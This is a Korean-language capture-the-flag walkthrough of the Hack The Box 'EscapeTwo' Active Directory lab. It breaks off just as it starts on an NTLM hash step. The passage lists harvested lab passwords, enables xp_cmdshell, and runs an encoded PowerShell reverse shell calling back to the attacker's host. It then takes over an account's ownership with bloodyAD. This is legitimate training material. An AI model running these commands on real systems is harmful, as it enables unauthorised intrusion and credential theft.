## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ nnmap 10.129.11.237                                             
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-19 09:18 +0900
Nmap scan report for 10.129.11.237
Host is up (0.25s latency).
Not shown: 65509 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-19 00:19:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-19T00:20:59+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2026-03-19T00:20:59+00:00; 0s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.11.237:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-03-19T00:20:59+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-18T23:44:27
|_Not valid after:  2056-03-18T23:44:27
| ms-sql-ntlm-info: 
|   10.129.11.237:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-19T00:20:59+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2026-03-19T00:20:59+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49737/tcp open  msrpc         Microsoft Windows RPC
49806/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-19T00:20:24
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   248.02 ms 10.10.14.1
2   248.07 ms 10.129.11.237

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.45 seconds

```

/etc/hosts 세팅
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ cat /etc/hosts

10.129.11.237   DC01.sequel.htb sequel.htb      DC01


```


주어진 자격증명으로 작동 서비스 확인 `rose / KxEPkKe6R8su`
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ netexec smb dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'
SMB         10.129.11.237   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.11.237   445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 

┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ netexec mssql dc01.sequel.htb -u rose -p 'KxEPkKe6R8su'
MSSQL       10.129.11.237   1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.129.11.237   1433   DC01             [+] sequel.htb\rose:KxEPkKe6R8su 


bloodhound-python -d 'dc01.sequel.htb' -u 'rose' -p 'KxEPkKe6R8su' -ns 10.129.5.22 -c All


```

SQLserver 접근
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ impacket-mssqlclient -windows-auth sequel.htb/rose:KxEPkKe6R8su@dc01.sequel.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SEQUEL\rose  guest@master)> 

```

4개의 데이터베이스 존재
```sql
SQL (SEQUEL\rose  guest@master)> select name from sys.databases;
name     
------   
master   

tempdb   

model    

msdb 
```

명령어를 실행할 권한은 없음
```bash
SQL (SEQUEL\rose  guest@master)> xp_cmdshell whoami;
ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.

SQL (SEQUEL\rose  guest@master)> enable_xp_cmdshell
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.

```

SMB 공유폴더 확인
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ netexec smb dc01.sequel.htb -u rose -p 'KxEPkKe6R8su' --shares
SMB         10.129.11.237   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.11.237   445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.129.11.237   445    DC01             [*] Enumerated shares
SMB         10.129.11.237   445    DC01             Share           Permissions     Remark
SMB         10.129.11.237   445    DC01             -----           -----------     ------
SMB         10.129.11.237   445    DC01             Accounting Department READ            
SMB         10.129.11.237   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.11.237   445    DC01             C$                              Default share
SMB         10.129.11.237   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.11.237   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.11.237   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.11.237   445    DC01             Users           READ            
```

smbclient로 접근 시 windows 사용자의 홈디렉터리임을 알 수 있음
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ smbclient //dc01.sequel.htb/users -U rose --password KxEPkKe6R8su
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Jun  9 22:42:11 2024
  ..                                 DR        0  Sun Jun  9 22:42:11 2024
  Default                           DHR        0  Sun Jun  9 20:17:29 2024
  desktop.ini                       AHS      174  Sat Sep 15 16:16:48 2018

                6367231 blocks of size 4096. 929754 blocks available
smb: \> cd Default
smb: \Default\> ls
  .                                 DHR        0  Sun Jun  9 20:17:29 2024
  ..                                DHR        0  Sun Jun  9 20:17:29 2024
  AppData                            DH        0  Sat Sep 15 16:19:00 2018
  Desktop                            DR        0  Sat Sep 15 16:19:00 2018
  Documents                          DR        0  Sun Jun  9 10:29:57 2024
  Downloads                          DR        0  Sat Sep 15 16:19:00 2018
  Favorites                          DR        0  Sat Sep 15 16:19:00 2018
  Links                              DR        0  Sat Sep 15 16:19:00 2018
  Music                              DR        0  Sat Sep 15 16:19:00 2018
  NTUSER.DAT                          A   262144  Sun Jun  9 10:29:57 2024
  NTUSER.DAT.LOG1                   AHS    57344  Sat Sep 15 15:09:26 2018
  NTUSER.DAT.LOG2                   AHS        0  Sat Sep 15 15:09:26 2018
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf    AHS    65536  Sun Jun  9 10:29:57 2024
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Jun  9 10:29:57 2024
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Jun  9 10:29:57 2024
  Pictures                           DR        0  Sat Sep 15 16:19:00 2018
  Saved Games                         D        0  Sat Sep 15 16:19:00 2018
  Videos                             DR        0  Sat Sep 15 16:19:00 2018

                6367231 blocks of size 4096. 929754 blocks available

```

`Accounting` 폴더 접근 후 파일 다운로드
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ smbclient //dc01.sequel.htb/Accounting\ Department -U rose --password KxEPkKe6R8su
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 19:52:21 2024
  ..                                  D        0  Sun Jun  9 19:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 19:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 19:52:07 2024

                6367231 blocks of size 4096. 929754 blocks available
smb: \> prompt off
smb: \> mget *
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (10.0 KiloBytes/sec) (average 10.0 KiloBytes/sec)
getting file \accounts.xlsx of size 6780 as accounts.xlsx (6.7 KiloBytes/sec) (average 8.3 KiloBytes/sec)

```

다운받은 파일들이 zip파일 확인
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ file accounting_2024.xlsx 
accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified Jan 01 1980 00:00:00, uncompressed size 1284, method=deflate
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ file accounts.xlsx       
accounts.xlsx: Zip archive data, made by v2.0, extract using at least v2.0, last modified Jun 09 2024 10:47:44, uncompressed size 681, method=deflate

```

압축 해제 
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ unzip accounts.xlsx -d accounts 
Archive:  accounts.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: accounts/xl/workbook.xml  
  inflating: accounts/xl/theme/theme1.xml  
  inflating: accounts/xl/styles.xml  
  inflating: accounts/xl/worksheets/_rels/sheet1.xml.rels  
  inflating: accounts/xl/worksheets/sheet1.xml  
  inflating: accounts/xl/sharedStrings.xml  
  inflating: accounts/_rels/.rels    
  inflating: accounts/docProps/core.xml  
  inflating: accounts/docProps/app.xml  
  inflating: accounts/docProps/custom.xml  
  inflating: accounts/[Content_Types].xml  
```

xml 파일 확인 시 자격증명 발견`
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo/accounts]
└─$ ls
'[Content_Types].xml'   docProps   _rels   xl

┌──(kali㉿kali)-[~/HTB/EscapeTwo/accounts]
└─$ grep -ri 'passw'                                      
xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>

cat accounts/xl/sharedStrings.xml | xmllint --xpath '//*[local-name()="t"]/text()' - | awk 'ORS=NR%5?",":"\n"'; echo First Name,Last Name,Email,Username,Password Angela,Martin,angela@sequel.htb,angela,0fwz7Q4mSpurIt99 Oscar,Martinez,oscar@sequel.htb,oscar,86LxLBMgEWaKUnBG Kevin,Malone,kevin@sequel.htb,kevin,Md9Wlq1E5bZnVDVo NULL,sa@sequel.htb,sa,MSSQLP@ssw0rd!
```

Oscar 자격증명 획득
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ nxc smb dc01.sequel.htb -u users.txt -p password.txt --continue-on-success
SMB         10.129.11.237   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.11.237   445    DC01             [-] sequel.htb\Angela:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\Oscar:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\Kevin:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\sa:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\Angela:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [+] sequel.htb\Oscar:86LxLBMgEWaKUnBG 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\Kevin:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\sa:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\Angela:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\Kevin:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\sa:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\Angela:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\Kevin:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\sa:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 

```

mssql 확인시 sa 자격증명 획득
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ netexec mssql dc01.sequel.htb -u users.txt -p password.txt --continue-on-success --local-auth | grep -F [+] 
MSSQL                    10.129.11.237   1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)

```

sa 계정 활용하여 mssql 접근
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ impacket-mssqlclient 'sequel.htb/sa:MSSQLP@ssw0rd!@dc01.sequel.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 

```

xp_cmdshell 불가가
```bash
SQL (sa  dbo@master)> xp_cmdshell whoami
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

```

xp_cmdshell 활성화
```bash
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   

NULL       
```

리버스쉘 생성 사이트 https://www.revshells.com/
![[Pasted image 20260319132524.png]]



리버스쉘 대기 후 명령어 수행

```bash
SQL (sa  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE;
SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE;EXEC sp_configure 'xp_cmdshell';
name          minimum   maximum   config_value   run_value   
-----------   -------   -------   ------------   ---------   
xp_cmdshell         0         1              1           1   

SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell';
name          minimum   maximum   config_value   run_value   
-----------   -------   -------   ------------   ---------   
xp_cmdshell         0         1              1           1   

SQL (sa  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAAyACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

```

리버스쉘 연결 성공
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.11.237] 49337
whoami
sequel\sql_svc
PS C:\Windows\system32> 


```

users 하위 디렉토리 확인인

```powershell
PS C:\users> tree /f /a
Folder PATH listing
Volume serial number is 3705-289D
C:.
+---Administrator
+---Public
|   +---Accounting Department
|   |       accounting_2024.xlsx
|   |       accounts.xlsx
|   |       
|   +---Documents
|   +---Downloads
|   +---Music
|   +---Pictures
|   \---Videos
+---ryan
\---sql_svc
    +---Desktop
    +---Documents
    +---Downloads
    +---Favorites
    +---Links
    +---Music
    +---Pictures
    +---Saved Games
    \---Videos

```

c:\sql2019\ExpressAdv_num 접근
```powershell
PS C:\SQL2019\ExpressAdv_ENU> ls


    Directory: C:\SQL2019\ExpressAdv_ENU


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         6/8/2024   3:07 PM                1033_ENU_LP                                                           
d-----         6/8/2024   3:07 PM                redist                                                                
d-----         6/8/2024   3:07 PM                resources                                                             
d-----         6/8/2024   3:07 PM                x64                                                                   
-a----        9/24/2019  10:03 PM             45 AUTORUN.INF                                                           
-a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML                                                         
-a----         6/8/2024   3:07 PM             16 PackageId.dat                                                         
-a----        9/24/2019  10:03 PM         142944 SETUP.EXE                                                             
-a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG                                                      
-a----         6/8/2024   3:07 PM            717 sql-Configuration.INI                                                 
-a----        9/24/2019  10:03 PM         249448 SQLSETUPBOOTSTRAPPER.DLL                                              

```

`sql-Configuration.INI` 내 패스워드 획득 `WqSZAF6CysDQbGb3`

```powershell
PS C:\SQL2019\ExpressAdv_ENU> cat sql-configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True

```

Ryan 자격증명 획득
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ nxc smb dc01.sequel.htb -u users.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success
SMB         10.129.11.237   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.11.237   445    DC01             [-] sequel.htb\Angela:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\Oscar:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\Kevin:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [-] sequel.htb\sa:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.129.11.237   445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 

```

WinRM 접근 가능
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ netexec winrm dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3
WINRM       10.129.11.237   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.129.11.237   5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)

┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i dc01.sequel.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> 

```


user.txt 획득
![[Pasted image 20260319133544.png]]

블러드하운드로 데이터 수집
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d 'sequel.htb' -dc 'dc01.sequel.htb' -ns 10.129.11.237 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 10 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.sequel.htb
INFO: Done in 00M 45S

```

CA_SVC 획득 가능

![[Pasted image 20260319134513.png]]

ryan이 ca_svc 오너가 아니기 때문에 실패

```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ certipy-ad shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.11.237
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fc80dd6705694701a341a51e570caa56'
[*] Adding Key Credential with device ID 'fc80dd6705694701a341a51e570caa56' to the Key Credentials for 'ca_svc'
[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0

```

Domain Admins 그룹

![[Pasted image 20260319134701.png]]

BloodyAD 사용하여 Ryan을 소유자로 변경, 모든 제어 권한 부여여
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ bloodyAD -d sequel.htb --host 10.129.11.237 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan 
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
                                                                                                                   
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ bloodyAD -d sequel.htb --host 10.129.11.237 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
[+] ryan has now GenericAll on ca_svc

```

ca_svc NTLM hash  획득
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
